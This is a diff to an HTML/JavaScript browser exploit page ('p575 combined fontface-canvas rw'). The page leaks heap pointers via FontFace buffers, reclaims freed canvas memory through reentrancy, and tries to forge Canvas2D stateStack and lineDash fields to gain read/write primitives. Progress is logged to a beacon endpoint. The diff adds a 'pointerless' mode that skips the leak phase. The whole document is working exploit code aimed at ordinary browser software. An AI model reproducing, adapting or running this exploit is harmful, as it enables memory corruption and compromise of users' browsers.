@@ -24,6 +24,7 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><title>p575 combined fontface-canvas rw</title>
 <script>
 function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
 function hex8(a,o){var s='';for(var i=0;i<8;i++){var v=a[o+i];s+=(v<16?'0':'')+v.toString(16);}return s;}
 function grab(v,o){var a=[];for(var i=0;i<8;i++)a.push(v[o+i]);return a;}
 function close(x,y){return Math.abs(x-y)<0.0001;}
@@ -33,6 +34,7 @@ function close(x,y){return Math.abs(x-y)<0.0001;}
    ================================================================ */
 
 var leaked58=null,leaked68=null;
+var P2=qint('p2',0); /* v2 pointerless (cobrajet adaptation, #295 04:22Z): p2=1 calls phase2() directly at boot — canvas reentrancy reclaim needs no leak; PH3/PH4 stay pointer-guarded. PH2-START beacon ternary-guarded (hex8(null) threw pointerless). */
 var abMap=[];
 
 function phase1(){
@@ -79,7 +81,7 @@ function scanPhase1(){
     if(nz>0&&abMap[i].size===192){
       leaked58=grab(v,0x58);leaked68=grab(v,0x68);
       b('P575-PH1-HIT-b'+i+'-nz'+nz+'-p58='+hex8(v,0x58)+'-p68='+hex8(v,0x68));
-      setTimeout(phase2,100);
+      if(!P2)setTimeout(phase2,100);
       return;
     }
   }
@@ -99,8 +101,8 @@ var canvasInner=null,canvasOuter=null;
 var retained=[];
 
 function phase2(){
-  if(!leaked58){b('P575-PH2-NOLEAK');return;}
-  b('P575-PH2-START-p58='+hex8(leaked58,0)+'-p68='+hex8(leaked68,0));
+  if(!P2&&!leaked58){b('P575-PH2-NOLEAK');return;}
+  b('P575-PH2-START'+(leaked58?'-p58='+hex8(leaked58,0)+'-p68='+hex8(leaked68,0):'-PTRLSS'));
   
   var canvas=document.createElement('canvas');
   canvas.width=1;canvas.height=1;document.body.appendChild(canvas);
@@ -180,6 +182,7 @@ function phase2(){
   
   /* Now try to forge the stateStack using the leaked FontFace pointer */
   b('P575-PH3-FORGE-ATTEMPT');
+  if(leaked58){
   
   /* The stateStack buffer is at some offset in the Canvas2D context.
      We need to forge lineDash{ptr,cap,size} at State offsets +184/+192/+196.
@@ -259,6 +262,7 @@ function phase2(){
       b('P575-PH3-FALLBACK-DASH-LEN='+fallbackDash.length+'-vals='+fallbackDash.slice(0,5).join(','));
     }else{b('P575-PH3-FALLBACK-DASH='+fallbackDash);}
   }
+  }else{b('P575-PH3-SKIP-PTRLESS');}
   
   /* ================================================================
      PHASE 4: Try to forge stateStack using Canvas write primitive
@@ -304,8 +308,9 @@ function phase2(){
 var aliasCanvas=null;
 
 function run(){
-  b('P575-BOOT');
+  b('P575-BOOT-p2='+P2);
   phase1();
+  if(P2)phase2();
 }
 if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(run,0);
 else document.addEventListener('DOMContentLoaded',run);
